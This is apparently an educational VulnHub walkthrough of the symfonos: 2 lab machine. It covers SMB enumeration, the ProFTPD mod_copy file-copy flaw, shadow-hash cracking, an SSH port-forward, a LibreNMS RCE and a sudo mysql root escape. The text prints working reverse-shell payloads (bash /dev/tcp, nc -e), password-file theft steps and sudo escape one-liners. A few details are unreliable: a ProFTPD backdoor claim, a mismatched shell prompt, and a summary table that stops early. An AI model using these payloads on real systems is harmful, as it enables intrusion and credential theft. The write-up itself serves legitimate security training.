# symfonos: 2 — VulnHub Walkthrough (Beginner Friendly)

> **Educational writeup.** Run this VM only on an isolated, host-only lab network.
> The goal is to understand *why* each step works, not just to copy commands.

| Field | Value |
| --- | --- |
| **Machine** | symfonos: 2 |
| **Difficulty** | Easy / Medium (a great first "chain several bugs together" box) |
| **Author** | Zayotic |
| **Released** | 18 July 2019 |
| **VulnHub Entry** | <https://vulnhub.com/entry/symfonos-2,331/> |
| **Download** | <https://vulnhub.com/entry/symfonos-2,331/#download> |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux (Debian-based; Samba + ProFTPD + Apache) |

> **Note:** DHCP is enabled, and exact service versions and flag strings **vary by
> build**. Every output below is *illustrative* — confirm against your own scan.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

- How to enumerate **SMB (Samba)** shares, including anonymous access.
- How a **log file** on a share can leak the exact path of a sensitive backup.
- How a **ProFTPD 1.3.5 file-copy flaw (CVE-2015-3306 / EDB 36742)** copies files
  with **no authentication**, letting you pull `/etc/shadow`.
- How to merge `passwd` + `shadow` and crack the hash with **John/Hashcat**.
- How to find a **localhost-only web app** and reach it with an **SSH port-forward**.
- How an old **LibreNMS** version gives an authenticated **RCE** (foothold as `cronus`).
- How a `sudo` rule on **`mysql`** becomes root (GTFOBins).

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You need Kali running and the ability to import
the VM and attach it to a host-only network.

---

## 1. Reconnaissance — finding the target

> **Goal:** find the target's IP address on your isolated lab network.

```bash
# See your own IP / lab subnet first
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **How to read it:** your Kali box holds a `192.168.56.x` (VirtualBox host-only) or
> `192.168.19x.x` (VMware) address. The target is on the **same** subnet.


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
# ARP-scan the subnet to list live hosts (fast: uses ARP, not a full TCP sweep)
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.1    08:00:27:xx:xx:xx   PCS Systemtechnik GmbH
192.168.56.10   08:00:27:aa:aa:aa   PCS Systemtechnik GmbH   <-- you (Kali)
192.168.56.101  08:00:27:bb:bb:bb   PCS Systemtechnik GmbH   <-- the target
```

**Target IP:** `192.168.56.101`

![arp-scan finding the target](images/01-recon.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

### 2.1 Port scanning


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
sudo nmap -sC -sV -p 21,22,80,139,445 -oA scans/services 192.168.56.101
```


> ### 📖 Concept — FTP, and why "anonymous" is the first thing to try
>
> **FTP** (port 21) predates modern authentication. It sends usernames, passwords and
> file contents in **cleartext**, and it has a built-in convention for public access:
> the account **`anonymous`**, traditionally with an email address (or nothing) as the
> password.
>
> ```bash
> ftp target                     # then: anonymous / (blank)
> curl -s ftp://anonymous:@target/
> wget -r ftp://anonymous:@target/          # mirror the whole tree
> nmap -p21 --script ftp-anon,ftp-vuln-cve2010-4221 target
> ```
>
> Inside an FTP session: `ls`, `cd`, `binary` (**switch mode before downloading
> anything non-text** — ASCII mode corrupts binaries), `get`, `mget`, `put`, `recurse`.
>
> **Two things to check immediately.** First, is anonymous access *enabled*? Second, is
> it **writable** — does `put shell.php` succeed? A writable FTP root that overlaps
> the web document root is a web-shell upload with no exploitation required. Also look
> for `backup.zip`, `creds.txt`, `id_rsa`, `web.config` and any `notes.txt` — authors
> leave the next step in a file named something obvious.
>
> ProFTPD 1.3.3c specifically ships a **compile-time backdoor** (`telnet target 6200`
> gives root); check the exact version against Exploit-DB before assuming you need
> credentials.
>
> **Deep dive:** [CONCEPTS §9.5 — FTP](../../docs/CONCEPTS.md#95-ftp--port-21)

```text
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD 1.3.5
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp  open  http        WebFS httpd 1.21
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```

> **Why it works:** `-p-` scans every TCP port; `-sV` fingerprints versions; `-sC` runs
> safe default scripts. Five services = five possible ways in. The **old versions**
> (ProFTPD 1.3.5, Samba 3/4) are the first things to research.

![nmap scan of the target](images/02-nmap.png)

### 2.2 SMB enumeration (anonymous access)


> ### 📖 Concept — SMB enumeration
>
> **SMB** (Server Message Block, ports 139/445) is Windows file and printer sharing,
> also present on most Linux servers via Samba. It is one of the richest enumeration
> targets there is: shares, users, groups, password policy, and often files.
>
> ```bash
> smbclient -L //target/ -N            # list shares with a NULL session (no credentials)
> smbclient //target/share -N          # connect; then: ls, cd, get, prompt, recurse
> smbmap -H target                     # shares AND your permission on each (R/W!)
> enum4linux -a target                 # users, groups, shares, policy — one shot
> crackmapexec smb target --shares     # modern, fast, scriptable
> rpcclient -U '' -N target            # then: enumdomusers, enumdomgroups, queryuser
> ```
>
> **Always try anonymous/NULL access first** — it is the most common finding. `-N`
> means "no password". If it works, `smbmap` will show `READ` or `WRITE` per share; a
> **writable** share you can reach over HTTP is a web-shell upload waiting to happen.
>
> Then hunt inside every share for `backup.zip`, `web.config`, `.kdbx`, `id_rsa`,
> `*.sql`, `site.txt`, `passwords.xls` — authors and real admins alike leave them
> there.
>
> **Deep dive:** [CONCEPTS §9.3 — SMB](../../docs/CONCEPTS.md#93-smb--ports-139445)

```bash
# List shares without credentials (-N = null session)
smbclient -L //192.168.56.101 -N
```

```text
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      Symfonos Anonymous Share
        IPC$            IPC       IPC Service (Samba 4.5.16-Debian)
```

> **Why it works:** the SMB server allows **guest/null sessions**, so we can list and
> read a share without any username or password. `anonymous` looks very interesting.

```bash
# Connect to the anonymous share and look around
smbclient //192.168.56.101/anonymous -N
```

```text
smb: \> ls
  .                                   D        0  ...
  ..                                  D        0  ...
  backups                             D        0  ...
smb: \> cd backups
smb: \backups\> ls
  log.txt                             N    11394  ...
smb: \backups\> get log.txt
getting file \backups\log.txt of size 11394
smb: \backups\> exit
```

![Reading the anonymous SMB share](images/03-smb-anon.png)

### 2.3 The leaked log file

```bash
cat log.txt
```

```text
root@symfonos2:~# cat /etc/shadow > /var/backups/shadow.bak
...
# (Samba configuration dump below)
[anonymous]
   path = /home/aeolus/share           <-- this share maps to aeolus's home
   browseable = yes
   guest ok = yes
...
# (ProFTPD configuration dump)
ServerName      "ProFTPD Default Installation"
...
```

> **Why it works:** a careless admin backed up the **shadow file to
> `/var/backups/shadow.bak`** and left a log of it on a world-readable share. The log
> also tells us the anonymous share is physically `/home/aeolus/share` and reveals the
> username **`aeolus`**. Now we need a way to *read* that shadow backup.

![log.txt leaking shadow.bak path and the share path](images/04-log-txt.png)

### 2.4 ProFTPD 1.3.5 — the file-copy flaw (CVE-2015-3306)

The FTP version is old. Searching for it points to **mod_copy**: unauthenticated
clients can copy files from anywhere to anywhere with `site cpfr` / `site cpto`.


> ### 📖 Concept — CVEs, Exploit-DB and searchsploit
>
> **The identifiers:**
> - **CVE** — a stable ID for one vulnerability. `CVE-2014-6271` is Shellshock.
>   Look it up at <https://nvd.nist.gov/vuln/search>.
> - **CVSS** — a 0.0–10.0 severity score. Useful for *prioritising*, **not** for
>   deciding exploitability: a CVSS 9.8 needing physical access is less useful to you
>   than a 5.3 reachable over HTTP.
> - **EDB ID** — a numbered public proof-of-concept on Exploit-DB.
>
> **`searchsploit`** is a **local, offline** search of the Exploit-DB archive shipped
> with Kali. Offline matters — it works mid-engagement with no internet.
>
> ```bash
> searchsploit wordpress 4.8            # search titles and paths
> searchsploit -t apache 2.4            # titles only — far fewer false positives
> searchsploit -m php/webapps/37596.py  # mirror (copy) it into your cwd
> searchsploit -x php/webapps/41006.txt # examine (print) it
> searchsploit -p 41006                 # show the full path
> searchsploit --update                 # refresh the local database
> ```
>
> > **Read the exploit before you run it.** Non-negotiable, for three reasons:
> > (1) many Exploit-DB entries are *unverified*, and some are outright malicious to
> > the person running them; (2) you need to know which parameters to change
> > (`RHOST`, `LHOST`, target path, memory offsets); (3) understanding it is the
> > entire point of the exercise.
>
> The workflow that actually works: get an exact **version** from `nmap -sV` or the
> app's own footer, search it, read the top candidate, then reproduce the request
> **by hand with `curl`** so you know what exploitation looked like. Only then decide
> whether the automated module is worth it.
>
> **Deep dive:** [CONCEPTS §11 — Finding and using exploits](../../docs/CONCEPTS.md#11-finding-and-using-exploits)

```bash
searchsploit ProFTPD 1.3.5
```

```text
ProFTPd 1.3.3c - File Copy                       | linux/remote/49900.py
ProFTPd 1.3.5 - File Copy                        | linux/remote/36742.txt
```

> **Why it works:** `mod_copy` implements server-side `SITE CPFR`/`SITE CPTO`. It does
> **not** check who is asking. So we can copy root's `shadow.bak` into a directory we
> *can* read (the SMB share) — no password required.

We drive it with a plain `ftp`/`telnet` session:

```bash
ftp 192.168.56.101
```

```text
Connected to 192.168.56.101.
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation)
Name (192.168.56.101:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
530 Login incorrect.          # login is refused, but SITE CPFR/CPTO still work
ftp> quote site cpfr /var/backups/shadow.bak
350 File or directory exists, ready for destination name
ftp> quote site cpto /home/aeolus/share/shadow.bak
250 Copy successful
ftp> quit
```

Repeat the same two commands to copy `/etc/passwd` as well:

```text
ftp> quote site cpfr /etc/passwd
350 File or directory exists, ready for destination name
ftp> quote site cpto /home/aeolus/share/passwd
250 Copy successful
ftp> quit
```

> **Why it works:** this is an **arbitrary file copy** as the FTP daemon user. Because
> the daemon can read `/etc/shadow`'s backup and can write into `aeolus`'s share, we
> effectively exfiltrate sensitive files through a channel we already control (SMB).

Now retrieve both files over the readable SMB share:

```bash
smbclient //192.168.56.101/anonymous -N -c 'cd ..; ls'
smbclient //192.168.56.101/anonymous -N -c 'get shadow.bak'
smbclient //192.168.56.101/anonymous -N -c 'get passwd'
ls -la shadow.bak passwd
```

![Copying shadow.bak via mod_copy and pulling it over SMB](images/05-modcopy.png)

---

## 3. Foothold

### 3.1 Cracking the shadow hash

`/etc/shadow` stores password **hashes**, not plaintext. `/etc/passwd` gives us the
usernames and home directories. Merge them, then crack offline:


> ### 📖 Concept — Where do wordlists come from?
>
> **`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
> RockYou was breached; they had stored **32 million passwords in plaintext** — no
> hashing at all. The dump became the most-used password list in security precisely
> because it records what real people actually chose. It has 14,344,392 entries,
> **ordered by observed frequency**, so the top of the file is disproportionately
> valuable. On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt      # 14344392
> ```
>
> **But a generic list fails against a themed box** — and that is where a *targeted*
> list wins:
>
> ```bash
> cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
> python3 cupp.py -i                                             # build from a person's name, birthday, pet
> crunch 6 6 -t for%%% -o dict.txt                               # generate from a known pattern
> ```
>
> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit their
> theme and then scatter theme words all over the website. `cewl` harvests exactly
> that vocabulary. If a box is called "Narak" and its homepage is full of Sanskrit
> words about hell, the password is very likely one of them — and very unlikely to be
> in `rockyou.txt`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist)
> ### 📖 Concept — How password cracking actually works
>
> A password hash is a **one-way** function. You cannot invert it — there is no
> "un-hash". You can only **guess and compare**: hash a candidate, see if it matches
> the target. Cracking speed is therefore measured in guesses per second, and the
> defence is to make each guess expensive.
>
> | Algorithm | GPU speed | Verdict |
> | --- | --- | --- |
> | MD5, SHA-1, SHA-256 | **Billions/sec** | Unusable for passwords |
> | MD5-crypt (`$1$`) | ~100k/sec | Obsolete |
> | bcrypt (`$2b$`) | ~20k/sec | Acceptable |
> | SHA-512-crypt (`$6$`) | ~10k/sec | Acceptable |
> | **phpass (`$P$`)** | ~5k/sec | WordPress/Drupal — 8192 MD5 rounds, deliberately slow |
> | yescrypt (`$y$`) | ~3k/sec | Modern Ubuntu default |
>
> ```bash
> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
> john --show hash.txt                       # results without re-cracking
> john --format=phpass --wordlist=rockyou.txt hash.txt    # force the format
> unshadow /etc/passwd /etc/shadow > combined.txt         # prepare Linux hashes
> hashcat -m 400 -a 0 hash.txt rockyou.txt                # -m = mode, -a 0 = wordlist
> ```
>
> **Reading John's output:** `Loaded 1 password hash (phpass, …)` means it
> auto-detected the format correctly — if it says `No password hashes loaded`, pass
> `--format=` explicitly (`john --list=formats` lists them all). `1g 0:00:00:14 DONE`
> means one guess succeeded in 14 seconds, and `3842p/s` is the candidate rate — **that
> low number is the algorithm's defence working.**
>
> > ⚠️ **Always single-quote a hash on the command line.** In double quotes or bare,
> > the shell expands `$P`, `$1`, `$6` as variables and silently truncates it. This is
> > one of the most common reasons a crack "finds nothing".
>
> **If the wordlist fails, add rules before giving up** — automatic mangling that
> capitalises, appends digits and applies leetspeak:
>
> ```bash
> john --wordlist=rockyou.txt --rules hash.txt
> hashcat -m 0 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
> ```
>
> `best64.rule` applies 64 transformations per word. A list that fails outright very
> often succeeds with rules, at 64× the cost.
>
> **Deep dive:** [CONCEPTS §14 — Password cracking](../../docs/CONCEPTS.md#14-password-cracking)

```bash
unshadow passwd shadow.bak > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# ...or offline with hashcat:
#   hashcat -m 1800 hashes /usr/share/wordlists/rockyou.txt
```

```text
Loaded 1 password hash (sha512crypt, crypt(3) $6$)
sergioteamo      (aeolus)
1g 0:00:00:05 DONE
```

> **Why it works:** `unshadow` combines the two files into the format John expects.
> The hash is `sha512crypt` (`$6$`), easy to crack when the password is in a wordlist.
> Reusing `rockyou` is why weak passwords fall instantly.

> **Unintended path:** some walkthroughs brute-force FTP with Hydra
> (`hydra -l aeolus -P rockyou.txt ftp://192.168.56.101`) to get the same password.
> The **intended** path is the mod_copy chain above.

### 3.2 SSH in as aeolus

```bash
ssh aeolus@192.168.56.101
# password: sergioteamo
```

```text
aeolus@symfonos2:~$
```

```bash
id
ls -la ~/share
```

```text
uid=1001(aeolus) gid=1001(aeolus) groups=1001(aeolus)
```

> **Why it works:** the recovered credentials are valid system accounts. We now have a
> real interactive shell as `aeolus`.

![SSH as aeolus](images/06-ssh-aeolus.png)

### 3.3 Find a hidden, localhost-only service


> ### 📖 Concept — Why you re-scan from the inside
>
> ```bash
> ss -tulnp
> ```
>
> `-t` TCP · `-u` UDP · `-l` listening · `-n` numeric (skip DNS — much faster) · `-p`
> show the owning process. (`netstat -antup` is the older equivalent.)
>
> **This is the post-exploitation version of `nmap -p-`, and it finds things nmap
> structurally cannot.** A service bound to `127.0.0.1` is invisible to an external
> scan — nmap connects to the target's *outside* address, and the daemon is not
> listening there. From inside, you see all of it.
>
> Loopback-only services are frequently the most vulnerable thing on the box: an
> unauthenticated **Redis** on 6379, a **MySQL** with an empty root password, a
> **MongoDB** with no auth, a debug console, an admin API. Look for lines like:
>
> ```text
> tcp LISTEN 0 128  127.0.0.1:3306  0.0.0.0:*  users:(("mysqld",pid=889,fd=22))
> ```
>
> Also enumerate outward, to find other hosts you can now reach:
>
> ```bash
> ip a; ip route; cat /etc/resolv.conf; arp -a; cat /etc/hosts
> ```
>
> **Deep dive:** [CONCEPTS §16.1 — Internal enumeration](../../docs/CONCEPTS.md#161-internal-enumeration)

```bash
ss -lntp
cat /etc/apache2/ports.conf       # or wherever Apache is configured
```

```text
LISTEN  0  128  127.0.0.1:8080   ...
# ports.conf also shows the site is bound to 8080 on the loopback interface only
```

> **Why it works:** the second web app listens on **127.0.0.1:8080**, so it is invisible
> from outside. But because we are *on* the box via SSH, we can forward the port to Kali.

Forward it using OpenSSH local port forwarding:

```bash
# On Kali (a new terminal):
ssh -L 8080:127.0.0.1:8080 aeolus@192.168.56.101
# Then browse http://127.0.0.1:8080/ on Kali
```

> **Why it works:** `-L` opens a tunnel: connections to Kali's localhost:8080 are
> forwarded over SSH and appear to the target as connections to its own loopback. This
> reaches services that never touch the network.

![Port-forwarding the localhost LibreNMS web app](images/07-portforward.png)

### 3.4 LibreNMS authenticated RCE

The forwarded page is **LibreNMS**. Log in with the same credentials
(`aeolus` / `sergioteamo`). This version is vulnerable to an **authenticated remote
code execution** flaw (CVE-2018-20434) in the device-add feature.

```bash
searchsploit librenms
```

```text
LibreNMS - addhost Authenticated Remote Code Execution | linux/webapps/47975.py
```


> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
# On Kali: start a listener
nc -lvnp 4444

# Run the exploit, pointing at the forwarded port, with aeolus creds
python3 47975.py -u aeolus -p sergioteamo -i 127.0.0.1
```

```text
www-data@symfonos2:/opt/librenms/html$     # shell as cronus/www-data
```

> **Why it works:** the device-add API builds an OS command from user input without
> sanitising it. An authenticated user can inject `; nc ... -e /bin/sh` and get a
> reverse shell. The web service runs as **`cronus`**.

Upgrade the shell to a full TTY:


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z, then: stty raw -echo; fg   ; and: export TERM=xterm
id
```

```text
uid=1000(cronus) gid=1000(cronus) groups=1000(cronus)
```

![Reverse shell as cronus from the LibreNMS exploit](images/08-cronus-shell.png)

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)

```bash
sudo -l
```

```text
User cronus may run the following commands on symfonos2:
    (root) NOPASSWD: /usr/bin/mysql
```

> **Why it works:** `cronus` may run **`mysql` as root with no password**. `mysql` can
> execute shell commands via its `\!` (or `system`) directive — and since it was started
> as root, the command runs as **root**. This is a documented GTFOBins abuse.

```bash
sudo mysql -e '\! /bin/sh'
```

```text
root@symfonos2:/opt/librenms/html#
```

```bash
id
cd /root
ls -la
cat proof.txt
```

```text
uid=0(root) gid=0(root) groups=0(root)
<the root flag — often /root/proof.txt, varies by build>
```

> **Tip:** the exact flag filename varies by build. If `proof.txt` isn't there, run
> `find /root -type f -name '*.txt'` to locate it.

![Root shell and the root flag](images/09-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Anonymous/guest SMB share | Samba (139/445), `anonymous` share | Reads internal files (`log.txt`) |
| 2 | Sensitive file left on a readable share | `backups/log.txt` | Leaks `shadow.bak` path + `aeolus` user |
